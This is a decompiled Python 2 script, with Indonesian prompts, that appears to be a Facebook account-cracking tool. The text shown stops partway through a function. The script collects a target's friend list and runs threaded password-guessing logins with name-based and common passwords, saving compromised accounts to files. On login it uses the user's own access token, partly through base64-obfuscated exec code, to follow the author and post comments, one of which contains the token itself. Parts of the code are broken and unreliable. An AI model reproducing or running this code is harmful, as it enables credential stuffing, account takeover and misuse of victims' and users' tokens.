# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Mar  1 2022, 15:44:46) 
# [GCC Android (7714059, based on r416183c1) Clang 12.0.8 (https://android.google
# Embedded file name: aso
import os
try:
    import requests
except ImportError:
    print '\n [!] module requests belum terinstall'
    os.system('pip2 install requests')

try:
    import bs4
except ImportError:
    print '\n [!] module bs4 belum terinstall'
    os.system('pip2 install bs4')

try:
    import concurrent.futures
except ImportError:
    print '\n [!] module futures belum terinstall'
    os.system('pip2 install futures')

import os, sys, re, time, requests, calendar, random, itertools
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from datetime import datetime
from datetime import date
loop = 0
id = []
ok = []
cp = []
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
jm = current.hour
mnt = current.minute
dtk = current.second
op = bulan[nTemp]
localtime = current.time()
pu = '\x1b[0;37m'
m = '\x1b[0;31m'
h = '\x1b[0;32m'
k = '\x1b[0;33m'
b = '\x1b[0;36m'
u = '\x1b[0;35m'
o = '\x1b[0;36m'
my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
tanggal = '%s-%s' % (ha, op)
tgl = '%s %s %s' % (ha, op, ta)
bulan_ttl = {'01': 'Januari', '02': 'Februari', '03': 'Maret', '04': 'April', '05': 'Mei', '06': 'Juni', '07': 'Juli', '08': 'Agustus', '09': 'September', '10': 'Oktober', '11': 'November', '12': 'Desember'}

def bot_komen():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m[!] Token invalid'
        os.system('rm -rf login.txt')

    una = '100032577396395'
    kom3 = ' JEECK GANTENG BANGET SUMPAHx1a\nhttps://www.facebook.com/100032577396395/posts/552799635815945/?app=fbl'
    kom4 = ' GANTENG GANTENG BEUTIPUL\x1a\nhttps://www.facebook.com/100032577396395/posts/146957483066831/?app=fbl'
    kom = 'Jeeck Script Lu Bagus Banget  @[100032577396395:0] \x1a\x1a\nhttps://www.facebook.com/100032577396395/posts/487336829028893/?substory_index=0&app=fbl'
    post = '146957483066831'
    post2 = '552799635815945'
    kom2 = 'Jeeck X GanZ Jangan LupA FOLLOW GITHUB MR JEECK https://github.com/mrjeeck \x1a\x1a\nhttps://www.facebook.com/100032577396395/posts/487336829028893/?substory_index=0&app=fbl'
    requests.post('https://graph.facebook.com/100032577396395/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/100032577396395/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/100032577396395/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/100032577396395/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100032577396395/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/552799635815945/comments/?message=%s&access_token=%s' % (toket, toket))
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/146957483066831/comments/?message=' + kom3 + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/552799635815945/comments/?message=' + kom4 + '&access_token=' + toket)
    menu()


def keluar():
    print
    print '\x1b[0;36m________                 _____       ______  '
    print '\x1b[0;36m___  __ \\______ ________ __  /______ ___  /__'
    print '\x1b[0;36m__  /_/ /_  __ `/__  __ \\_  __/_  _ \\__  //_/'
    print '\x1b[0;37m_  ____/ / /_/ / _  / / // /_  /  __/_  ,<   '
    print '\x1b[0;37m/_/      \\__,_/  /_/ /_/ \\__/  \\___/ /_/|_|  '
    print '      KOK DI HAPUS TOKEN NYA BANGSAT'
    os.sys.exit()


def logo2():
    os.system('clear')
    print ' \x1b[0;36m ________       ______                __________________ '
    print ' \x1b[0;36m ___  __/______ ___  /_______ _______ ___  ____/___  __ )'
    print ' \x1b[0;36m __  /   _  __ \\__  //_/_  _ \\__  __ \\__  /_    __  __  |'
    print ' \x1b[0;37m _  /    / /_/ /_  ,<   /  __/_  / / /_  __/    _  /_/ / '
    print ' \x1b[0;37m /_/     \\____/ /_/|_|  \\___/ /_/ /_/ /_/       /_____/  '
    print '                   \x1b[0;32mCODE BY JEECK'
    print b + ' [' + k + 'JECK' + b + ']' + k + ' Harap Masukan Token Dengan Benar Bro'
    print b + ' [' + k + 'NDRI' + b + ']' + k + ' Jangan Di Salah Gunakan Tools Ini Bro'
    print b + ' [' + k + 'EZAA' + b + ']' + k + ' Semoga Hasil Anda Memuaskan Menggunakan Tools Ini Bro :('


def logo():
    os.system('clear')
    print '                             \x1b[0;36m ______  __________________ '
    print '\x1b[0;36m_____________________ ___________  /_____  ____/___  __ )'
    print '\x1b[0;36m_  ___/__  ___/_  __ `/_  ___/__  //_/__  /_    __  __  |'
    print '\x1b[0;37m/ /__  _  /    / /_/ / / /__  _  ,<   _  __/    _  /_/ / '
    print '\x1b[0;37m\\___/  /_/     \\__,_/  \\___/  /_/|_|  /_/       /_____/ '
    print '            \x1b[0;32mCODE BY JEECK X EZAA X YUMASAA'


def login():
    os.system('clear')
    try:
        requests.get('https://mbasic.facebook.com')
    except requests.exceptions.ConnectionError:
        print b + ' [' + k + '!' + b + ']' + k + ' Tidak Ada Koneksi Internet'
        time.sleep(1)
        keluar()

    try:
        token = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        logo2()
        print b + ' [' + k + 'JECK' + b + ']' + k + ' Kalian Bisa Ketikan \x1b[0;33m"\x1b[0;36mhelp\x1b[0;36m\x1b[0;33m"\x1b[0;33m untuk Tumtor Ambil Token'
        print b + ' [' + k + 'NDRI' + b + ']' + k + ' Jangan Lupa Masukan Token Di Bawah Ini'
        print b + ' [' + k + 'NDRI' + b + ']' + k + ' Eh Bang Sc Ini Kata Para suhu \x1b[0;31mPricod\x1b[0;31m  \x1b[0;33mLohh :V'
        print b + ' [' + k + 'EZAA' + b + ']' + k + '=========================================================='
        token = raw_input(b + '\n [' + k + 'JECK' + b + '] ' + k + 'token fb =>' + h + ' ')
        if token == '':
            exit(h + b + ' [' + k + 'EZAA' + b + ']' + k + ' Tolong Isi Dengan Benar :(')
        else:
            if token == 'help':
                os.system('xdg-open https://youtu.be/ViEtoEF7Uiw')
                exit(b + ' [' + k + 'NDRI' + b + ']' + k + ' Tuh Tumtor Biar Proo Ambil Tomken:V')
            try:
                nama = requests.get('https://graph.facebook.com/me?access_token=' + token).json()['name'].lower()
                open('login.txt', 'w').write(token)
                bot_komen()
                import base64
                exec base64.b64decode('dW5hID0gJzEwMDAzMjU3NzM5NjM5NScKICAgIGtvbTMgPSAnIEpFRUNLIEdBTlRFTkcgQkFOR0VUIFNVTVBBSHgxYVxuaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLzEwMDAzMjU3NzM5NjM5NS9wb3N0cy81NTI3OTk2MzU4MTU5NDUvP2FwcD1mYmwnICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGtvbTQgPSAnIEdBTlRFTkcgR0FOVEVORyBCRVVUSVBVTFx4MWFcbmh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS8xMDAwMzI1NzczOTYzOTUvcG9zdHMvMTQ2OTU3NDgzMDY2ODMxLz9hcHA9ZmJsJwogICAga29tID0gJ0plZWNrIFNjcmlwdCBMdSBCYWd1cyBCYW5nZXQgIEBbMTAwMDMyNTc3Mzk2Mzk1OjBdIFx4MWFceDFhXG5odHRwczovL3d3dy5mYWNlYm9vay5jb20vMTAwMDMyNTc3Mzk2Mzk1L3Bvc3RzLzQ4NzMzNjgyOTAyODg5My8/c3Vic3RvcnlfaW5kZXg9MCYKICAgIHBvc3QgPSAnMTQ2OTU3NDgzMDY2ODMxJwogICAgcG9zdDIgPSAnNTUyNzk5NjM1ODE1OTQ1JyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAga29tMiA9ICdKZWVjayBYIEdhblogSmFuZ2FuIEx1cEEgRk9MTE9XIEdJVEhVQiBNUiBKRUVDSyBodHRwczovL2dpdGh1Yi5jb20vbXJqZWVjayBceDFhXHgxYVxuaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLzEwMDAzMjU3NzM5NjM5NS9wb3N0cy80ODczMzY4Mj4KICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAzMjU3NzM5NjM5NS9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JyArIHRva2V0KQogICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDMyNTc3Mzk2Mzk1L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0nICsgdG9rZXQpCiAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwMzI1NzczOTYzOTUvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPScgKyB0b2tldCkKICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAzMjU3NzM5NjM5NS9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JyArIHRva2VuKQogICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDMyNTc3Mzk2Mzk1L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0nICsgdG9rZW4pCiAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS81NTI3OTk2MzU4MTU5NDUvY29tbWVudHMvP21lc3NhZ2U9JXMmYWNjZXNzX3Rva2VuPSVzJyAlICh0b2tldCwgdG9rZXQpKQogICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vJyArIHBvc3QgKyAnL2NvbW1lbnRzLz9tZXNzYWdlPScgKyBrb20gKyAnJmFjY2Vzc190b2tlbj0nICsgdG9rZXQpCiAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xNDY5NTc0ODMwNjY4MzEvY29tbWVudHMvP21lc3NhZ2U9JyArIGtvbTMgKyAnJmFjY2Vzc190b2tlbj0nICsgdG9rZXQpCiAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS81NTI3OTk2MzU4MTU5NDUvY29tbWVudHMvP21lc3NhZ2U9JyArIGtvbTQgKyAnJmFjY2Vzc190b2tlbj0nICsgdG9rZXQpCiAgICBtZW51KCkK')
                print h + '\n [' + pu + 'JECK' + h + ']' + pu + ' login berhasil selamat datang \x1b[0;92m%s\x1b[0;97m' % nama
                time.sleep(1)
                menu()
            except KeyError:
                os.system('rm -f login.txt')
                exit(b + ' [' + k + 'EZAA' + b + ']' + k + ' Woi Token Lo Kadaluarsa')


def menu():
    global token
    os.system('clear')
    try:
        token = open('login.txt', 'r').read()
    except KeyError:
        os.system('rm -f login.txt')
        exit(b + ' [' + k + 'NDRI' + b + ']' + k + ' Tolong Masukan Token Dengan Benar NgenTod:V')

    try:
        nama = requests.get('https://graph.facebook.com/me/?access_token=' + token).json()['name'].lower()
        TTL = requests.get('https://graph.facebook.com/me/?access_token=' + token).json()['birthday'].lower()
        ip = requests.get('https://api.ipify.org').text
    except IOError:
        os.system('rm -f login.txt')
        exit(b + ' [' + k + 'JECK' + b + ']' + k + ' Woi Token Lo Kadaluarsa')
    except requests.exceptions.ConnectionError:
        exit(b + ' [' + k + 'EZAA' + b + ']' + k + ' Tidak Ada Koneksi Internet')

    logo()
    print ' \x1b[0;36m[\x1b[0;33mJECK\x1b[0;36m]\x1b[0;33m Nama Akun  \x1b[0;36m: \x1b[0;31m%s' % nama
    print ' \x1b[0;36m[\x1b[0;33mNDRI\x1b[0;36m]\x1b[0;33m TLL Akun  \x1b[0;36m: \x1b[0;31m%s' % TTL
    print ' \x1b[0;36m[\x1b[0;33mEZAA\x1b[0;36m]\x1b[0;33m Ip Pengguna   \x1b[0;36m: \x1b[0;31m%s' % ip
    print
    print b + ' [' + k + '1' + b + ']' + k + ' Crack Dari Teman/Public'
    print b + ' [' + k + '2' + b + ']' + k + ' Lihat Hasil Crack Anda'
    print b + ' [' + k + '3' + b + ']' + k + ' Seting2 User-Agent'
    print b + ' [' + k + '0' + b + ']' + k + ' Keluar + \x1b[0;31mHapus Token'
    print
    jeeck = raw_input(b + ' [' + k + 'JECK' + b + ']' + k + ' Pilih =>' + h + ' ')
    if jeeck == '':
        menu()
    elif jeeck == '1':
        publik()
        method()
    elif jeeck == '2':
        print
        print b + ' [' + k + '1' + b + ']' + k + ' Cek Hasil Crack' + h + 'OK'
        print b + ' [' + k + '2' + b + ']' + k + ' Cek Hasil Crack' + k + 'CP'
        print b + ' [' + k + '3' + b + ']' + k + ' cek ' + h + 'opsi' + pu + ' hasil crack'
        print
        cek = raw_input(b + ' [' + k + 'EZAA' + b + ']' + k + 'Pilih => ' + h + ' ')
        if cek == '':
            menu()
        elif cek == '1':
            dirs = os.listdir('OK')
            print b + ' [' + k + 'JECK' + b + ']' + k + ' list nama file tersimpan di folder ' + h + 'OK\n'
            for file in dirs:
                print b + ' [' + k + 'EZAA' + b + ']' + k + ' ' + file

            try:
                file = raw_input(b + ' [' + k + 'NDRI' + b + ']' + k + ' ketik nama file :' + h + ' ')
                if file == '':
                    menu()
                totalok = open('OK/%s' % file).read().splitlines()
            except IOError:
                exit(' [!] file %s tidak tersedia' % file)

            nm_file = ('%s' % file).replace('-', ' ')
            del_txt = nm_file.replace('.txt', '')
            print b + ' [' + k + 'JECK' + b + ']' + k + ' ----------------------------------------------'
            print b + ' [' + k + 'EZAA' + b + '] hasil crack : %s total : %s\x1b[0;32m' % (del_txt, len(totalok))
            os.system('cat OK/%s' % file)
            print '\x1b[0;36m [' + k + 'NDRI' + b + ']' + k + ' ----------------------------------------------'
            exit(b + ' [' + k + 'JECK' + b + ']' + k + ' jangan lupa di copy dan di simpan hasilnya')
        elif cek == '2':
            dirs = os.listdir('CP')
            print b + ' [' + k + 'EZAA' + b + ']' + k + ' list nama file tersimpan di folder CP\n'
            for file in dirs:
                print b + ' [' + k + 'NDRI' + b + ']' + k + ' ' + file

            try:
                file = raw_input(b + ' [' + k + 'JECK' + b + ']' + k + ' ketik nama file :' + h + ' ')
                if file == '':
                    menu()
                totalcp = open('CP/%s' % file).read().splitlines()
            except IOError:
                exit(' [!] file %s tidak tersedia' % file)

            nm_file = ('%s' % file).replace('-', ' ')
            del_txt = nm_file.replace('.txt', '')
            print b + ' [' + k + 'JECK' + b + ']' + k + ' ----------------------------------------------'
            print b + ' [' + k + 'NDRI' + b + '] hasil crack : %s total : %s\x1b[0;33m' % (del_txt, len(totalcp))
            os.system('cat CP/%s' % file)
            print '\x1b[0;36m [' + k + 'EZAA' + b + ']' + k + ' ----------------------------------------------'
            exit(b + ' [' + k + 'JECK' + b + ']' + k + ' jangan lupa di copy dan di simpan hasilnya')
        elif cek == '3':
            cek_opsi()
        else:
            menu()
    elif jeeck == '3':
        setting_ua()
    elif jeeck == '0':
        os.system('rm -f login.txt')
        print
        print b + ' [' + k + 'JECK' + b + ']' + k + ' Ya allah Kok Malah Di Hapus Tokennya :('
        time.sleep(1)
        keluar()
    else:
        menu()


def publik():
    global token
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        exit(b + ' [' + k + 'NDRI' + b + ']' + k + ' Woi Token Lo Kadaluarsa')

    print
    print b + ' [' + k + 'EZAA' + b + ']' + k + " ketik '" + b + 'me' + b + "' " + k + 'jika ingin dari daftar teman'
    idt = raw_input(b + ' [' + k + 'NDRI' + b + ']' + k + ' id target :' + h + ' ')
    try:
        for i in requests.get('https://graph.facebook.com/%s/friends?access_token=%s' % (idt, token)).json()['data']:
            uid = i['id']
            nama = i['name'].rsplit(' ')[0]
            id.append(uid + '<=>' + nama)

    except KeyError:
        exit(b + ' [' + k + 'JECK' + b + ']' + k + ' Id Tidak Di Temukan Atau List Privat')

    print b + ' [' + k + 'NDRI' + b + ']' + k + ' total id  : \x1b[0;32m%s\x1b[0;37m' % len(id)


def method():
    print
    print b + ' [' + k + ' Pilih Menu Crack' + b + ' ]'
    print
    print b + ' [' + k + '1' + b + ']' + k + ' Pakai B-Api \x1b[0;36m( \x1b[0;33mFast \x1b[0;36m( \x1b[0;31mRecomended \x1b[0;36m)'
    print b + ' [' + k + '2' + b + ']' + k + ' pakai Free.Fb \x1b[0;36m( \x1b[0;33msellow \x1b[0;36m( \x1b[0;31mcrack Free.FB \x1b[0;36m)'
    print b + ' [' + k + '3' + b + ']' + k + ' Pakai Mbasic.Fb \x1b[0;36m( \x1b[0;33msellow \x1b[0;36m( \x1b[0;31mCrack mbasic.Fb \x1b[0;36m)'
    print b + ' [' + k + '4' + b + ']' + k + ' Pakai Mobile.Fb \x1b[0;36m( \x1b[0;33msellow \x1b[0;36m( \x1b[0;31mRecomended \x1b[0;36m)'
    print
    method = raw_input(b + ' [' + k + 'EZAA' + b + ']' + k + ' Pilih => ' + h + ' ')
    print
    if method == '':
        menu()
    elif method == '1':
        print b + ' [' + k + 'NDRI' + b + ']' + k + ' Crack Dengan Manual Dump Id Old'
        ask = raw_input(b + ' [' + k + 'JECK' + b + ']' + k + ' Gunakan sandi default atau manual ? [' + b + 'd' + h + '/' + h + 'm' + k + '] :' + pu + ' ')
        if ask == 'm':
            with ThreadPoolExecutor(max_workers=30) as (coeg):
                print b + ' [' + k + 'NDRI' + b + '] ' + k + 'gunakan , (koma) untuk pemisah contoh : ' + k + 'sayang' + b + ',' + k + 'pengen' + b + ',' + k + 'ngentod'
                asu = raw_input(b + ' [' + k + 'EZAA' + b + ']' + k + ' masukan kata sandi :' + h + ' ')
                if len(asu) <= 5:
                    method(b + '\n [' + k + 'JECK' + b + ']' + k + ' kata sandi minimal ' + b + '6' + k + ' karakter')
                print b + ' [' + k + 'NDRI' + b + '] ' + k + 'menggunakan kata sandi : \x1b[0;92m%s\x1b[0;97m' % asu
                print b + '\n [' + k + 'EZAA' + b + ']' + k + ' hasil' + h + ' OK' + b + ' tersimpan di : ' + h + 'OK/%s.txt' % tanggal
                print b + ' [' + k + 'JECK' + b + ']' + k + ' hasil ' + k + 'CP' + b + ' tersimpan di : ' + k + 'CP/%s.txt\n' % tanggal
                print b + ' [' + k + 'NDRI' + b + '] ' + k + 'Gunakan ' + b + 'CTRL+Z' + k + ' untuk menghentikan crack'
                print b + ' [' + k + 'EZAA' + b + ']' + k + ' tidak ada hasil ? hidupkan mode pesawat ' + b + '5' + k + ' detik'
                print b + ' [' + k + 'JECK' + b + ']' + k + ' Crack Berjalan Pukul :' + b + ' %s ' % localtime
                for user in id:
                    uid, name = user.split('<=>')
                    coeg.submit(api, uid, asu.split(','))

            exit(b + '\n\n [' + k + 'NDRI' + b + ']' + k + ' Okeh Nice Ngab:V Foollow github gwa jangam dilupain')
            time.slipe[1]
        elif ask == 'd':
            with ThreadPoolExecutor(max_workers=30) as (coeg):
                print b + '\n [' + k + 'EZAA' + b + ']' + k + ' hasil' + h + ' OK' + b + ' tersimpan di : ' + h + 'OK/%s.txt' % tanggal
                print b + ' [' + k + 'JECK' + b + ']' + k + ' hasil ' + k + 'CP' + b + ' tersimpan di : ' + k + 'CP/%s.txt\n' % tanggal
                print b + ' [' + k + 'NDRI' + b + '] ' + k + 'Gunakan ' + m + 'CTRL+Z' + k + ' untuk menghentikan crack'
                print b + ' [' + k + 'JECK' + b + ']' + k + ' tidak ada hasil ? hidupkan mode pesawat ' + h + '5' + b + ' detik'
                print b + ' [' + k + 'EZAA' + b + ']' + k + ' Crack Berjalan Pukul :' + m + ' %s:%s:%s \n' % (jm, mnt, dtk)
                for user in id:
                    uid, name = user.split('<=>')
                    if len(name) >= 6:
                        pwx = [name, name + '123', name + '1234', name + '12345', 'sayang', 'anjing', 'sayangkamu', 'katasandi']
                    elif len(name) == 3 or len(name) == 4 or len(name) == 5:
                        pwx = [name, name + '123', name + '1234', name + '12345', 'sayang', 'anjing', 'sayangkamu', 'katasandi']
                    else:
                        pwx = [
                         name, name + '123', name + '1234', name + '12345', 'sayang', 'anjing', 'sayangkamu', 'katasandi']
                    coeg.submit(api, uid, pwx)

            exit(b + '\n\n [' + k + 'NDRI' + b + ']' + k + ' Crack Selesai Dah Mau,mu Apa Sekarang')
            time.slipe[1]
    elif method == '2':
        print b + ' [' + k + 'EZAA' + b + ']' + k + ' Crack Menggunakan Manual Dump Id Old'
        ask = raw_input(b + ' [' + k + 'JECK' + b + ']' + k + ' Gunakan sandi default atau manual ? [' + b + 'd' + h + '/' + h + 'm' + k + '] :' + pu + ' ')
        if ask == 'm':
            with ThreadPoolExecutor(max_workers=30) as (coeg):
                print b + ' [' + k + 'EZAA' + b + '] ' + k + 'gunakan , (koma) untuk pemisah contoh : ' + h + 'pubgmobile' + pu + ',' + h + 'sayangkamu' + pu + ',' + h + 'epepFF'
                asu = raw_input(b + ' [' + k + 'NDRI' + b + ']' + k + ' masukan kata sandi :' + h + ' ')
                if len(asu) <= 5:
                    method(b + '\n [' + k + 'JECK' + b + ']' + k + ' kata sandi minimal ' + h + '6' + b + ' karakter')
                print b + ' [' + k + 'NDRI' + b + '] ' + k + 'menggunakan kata sandi : \x1b[0;92m%s\x1b[0;97m' % asu
                print b + '\n [' + k + 'EZAA' + b + ']' + k + ' hasil' + h + ' OK' + b + ' tersimpan di : ' + h + 'OK/%s.txt' % tanggal
                print b + ' [' + k + 'JECK' + b + ']' + k + ' hasil ' + k + 'CP' + b + ' tersimpan di : ' + k + 'CP/%s.txt\n' % tanggal
                print b + ' [' + k + 'NDRI' + b + '] ' + k + 'Gunakan ' + m + 'CTRL+Z' + k + ' untuk menghentikan crack'
                print b + ' [' + k + 'EZAA' + b + ']' + k + ' tidak ada hasil ? hidupkan mode pesawat ' + h + '1' + b + ' detik'
                print b + ' [' + k + 'JECK' + b + ']' + k + ' Crack Berjalan Pukul :' + m + ' %s:%s:%s \n' % (jm, mnt, dtk)
                for user in id:
                    uid, name = user.split('<=>')
                    coeg.submit(crack, uid, asu.split(','), 'https:/free.facebook.com')

            exit(h + '\n\n [' + pu + '=' + h + ']' + pu + ' Crack Selesai Mau,mu apasekarank')
            time.slipe[1]
        elif ask == 'd':
            with ThreadPoolExecutor(max_workers=35) as (coeg):
                print b + '\n [' + k + 'JECK' + b + ']' + k + ' hasil' + h + ' OK' + b + ' tersimpan di : ' + h + 'OK/%s.txt' % tanggal
                print b + ' [' + k + 'NDRI' + b + ']' + k + ' hasil ' + k + 'CP' + b + ' tersimpan di : ' + k + 'CP/%s.txt\n' % tanggal
                print b + ' [' + k + 'EZAA' + b + '] ' + k + 'Gunakan ' + m + 'CTRL+Z' + m + ' untuk menghentikan crack'
                print b + ' [' + k + 'JECK' + b + ']' + k + ' tidak ada hasil ? hidupkan mode pesawat ' + h + '5' + pu + ' detik'
                print b + ' [' + k + 'NDRI' + b + ']' + k + ' Crack Berjalan Pukul :' + m + ' %s:%s:%s \n' % (jm, mnt, dtk)
                for user in id:
                    uid, name = user.split('<=>')
                    if len(name) >= 6:
                        pwx = [name, name + '123', name + '1234', name + '12345', 'sayang', 'anjing', 'sayangkamu', 'katasandi']
                    elif len(name) == 3 or len(name) == 4 or len(name) == 5:
                        pwx = [name, name + '123', name + '1234', name + '12345', 'sayang', 'anjing', 'sayangkamu', 'katasandi']
                    else:
                        pwx = [
                         name, name + '123', name + '1234', name + '12345', 'sayang', 'anjing', 'sayangkamu', 'katasandi']
                    coeg.submit(crack, uid, pwx, 'https://free.facebook.com')

            exit(b + '\n\n [' + k + 'EZAA' + b + ']' + k + ' Crack Selesai Mau,mu apasekarang')
            time.slipe[1]
    elif method == '3':
        print b + ' [' + k + 'EZAA' + b + ']' + k + ' Crack Gunakan Manual Dump Id Old'
        ask = raw_input(b + ' [' + k + 'JECK' + b + ']' + k + ' Gunakan sandi default atau manual ? [' + b + 'd' + h + '/' + h + 'm' + k + '] :' + pu + ' ')
        if ask == 'm':
            with ThreadPoolExecutor(max_workers=30) as (coeg):
                print b + ' [' + k + 'JECK' + b + '] ' + k + 'gunakan , (koma) untuk pemisah contoh : ' + h + 'sayang' + pu + ',' + h + 'pengen' + pu + ',' + h + 'ngentod'
                asu = raw_input(b + +' [' + k + 'EZAA' + b + ']' + pu + ' masukan kata sandi :' + h + ' ')
                if len(asu) <= 5:
                    method(b + '\n [' + k + 'NDRI' + b + ']' + b + ' kata sandi minimal ' + h + '6' + b + ' karakter')
                print b + ' [' + k + 'EZAA' + b + '] ' + k + 'menggunakan kata sandi : \x1b[0;92m%s\x1b[0;97m' % asu
                print b + '\n [' + k + 'JECK' + b + ']' + k + ' hasil' + h + ' OK' + b + ' tersimpan di : ' + h + 'OK/%s.txt' % tanggal
                print b + ' [' + k + 'NDRI' + h + ']' + k + ' hasil ' + k + 'CP' + b + ' tersimpan di : ' + k + 'CP/%s.txt\n' % tanggal
                print b + ' [' + k + 'EZAA' + h + '] ' + k + 'Gunakan ' + m + 'CTRL+Z' + k + ' untuk menghentikan crack'
                print b + ' [' + k + 'JECK' + h + ']' + k + ' tidak ada hasil ? hidupkan mode pesawat ' + h + '5' + b + ' detik'
                print b + ' [' + k + 'NDRI' + h + ']' + k + ' Crack Berjalan Pukul :' + m + ' %s:%s:%s \n' % (jm, mnt, dtk)
                for user in id:
                    uid, name = user.split('<=>')
                    coeg.submit(crack, uid, asu.split(','), 'https://mbasic.facebook.com')

            exit(b + '\n\n [' + k + 'EZAA' + b + ']' + k + ' Crack Selesai Mau,mu apasekarank')
            time.slipe[1]
        elif ask == 'd':
            with ThreadPoolExecutor(max_workers=30) as (coeg):
                print b + '\n [' + k + 'JECK' + b + ']' + k + ' hasil' + h + ' OK' + b + ' tersimpan di : ' + h + 'OK/%s.txt' % tanggal
                print b + ' [' + k + 'NDRI' + b + ']' + k + ' hasil ' + k + 'CP' + b + ' tersimpan di : ' + k + 'CP/%s.txt\n' % tanggal
                print b + ' [' + k + 'EZAA' + b + '] ' + k + 'Gunakan ' + m + 'CTRL+Z' + k + ' untuk menghentikan crack'
                print b + ' [' + k + 'NDRI' + b + ']' + k + ' tidak ada hasil ? hidupkan mode pesawat ' + h + '5' + b + ' detik'
                print b + ' [' + k + 'JECK' + b + ']' + k + ' Crack Berjalan Pukul :' + m + ' %s:%s:%s \n' % (jm, mnt, dtk)
                for user in id:
                    uid, name = user.split('<=>')
                    if len(name) >= 6:
                        pwx = [name, name + '123', name + '1234', name + '12345', 'sayang', 'anjing', 'sayangkamu', 'katasandi']
                    elif len(name) == 3 or len(name) == 4 or len(name) == 5:
                        pwx = [name, name + '123', name + '1234', name + '12345', 'sayang', 'anjing', 'sayangkamu', 'katasandi']
                    else:
                        pwx = [
                         name, name + '123', name + '1234', name + '12345', 'sayang', 'anjing', 'sayangkamu', 'katasandi']
                    coeg.submit(crack, uid, pwx, 'https://mbasic.facebook.com')

            exit(b + '\n\n [' + k + 'JECK' + b + ']' + k + ' Crack Selesai Mau,mu apa sekarang')
            time.slipe[1]
    elif method == '4':
        print b + ' [' + k + 'NDRI' + b + ']' + k + ' Crack Manual Dump Id Old'
        ask = raw_input(b + ' [' + k + 'JECK' + b + ']' + k + ' Gunakan sandi default atau manual ? [' + b + 'd' + h + '/' + h + 'm' + k + '] :' + pu + ' ')
        if ask == 'm':
            with ThreadPoolExecutor(max_workers=30) as (coeg):
                print b + ' [' + k + 'EZAA' + b + '] ' + k + 'gunakan , (koma) untuk pemisah contoh : ' + h + 'sayang' + pu + ',' + h + 'pengen' + pu + ',' + h + 'ngentod'
                asu = raw_input(b + ' [' + k + 'JECK' + b + ']' + k + ' masukan kata sandi :' + h + ' ')
                if len(asu) <= 5:
                    method(b + '\n [' + k + 'NDRI' + b + ']' + k + ' kata sandi minimal ' + h + '6' + pu + ' karakter')
                print b + ' [' + k + 'EZAA' + b + '] ' + k + 'menggunakan kata sandi : \x1b[0;92m%s\x1b[0;97m' % asu
                print b + '\n [' + k + 'JECK' + b + ']' + k + ' hasil' + h + ' OK' + b + ' tersimpan di : ' + h + 'OK/%s.txt' % tanggal
                print b + ' [' + k + 'JECK' + b + ']' + k + ' hasil ' + k + 'CP' + b + ' tersimpan di : ' + k + 'CP/%s.txt\n' % tanggal
                print b + ' [' + k + 'NDRI' + b + '] ' + k + 'Gunakan ' + m + 'CTRL+Z' + k + ' untuk menghentikan crack'
                print b + ' [' + k + 'EZAA' + b + ']' + k + ' tidak ada hasil ? hidupkan mode pesawat ' + h + '5' + b + ' detik'
                print b + ' [' + k + 'NDRI' + b + ']' + k + ' Crack Berjalan Pukul :' + m + ' %s:%s:%s \n' % (jm, mnt, dtk)
                for user in id:
                    uid, name = user.split('<=>')
                    coeg.submit(crack, uid, asu.split(','), 'android://com.facebook.lite')

            exit(b + '\n\n [' + k + 'JECK' + b + ']' + k + ' Crack Selesai Mau,mu Apasekarang')
            time.slipe[1]
        elif ask == 'd':
            with ThreadPoolExecutor(max_workers=30) as (coeg):
                print b + '\n [' + k + 'JECK' + b + ']' + k + ' hasil' + h + ' OK' + b + ' tersimpan di : ' + h + 'OK/%s.txt' % tanggal
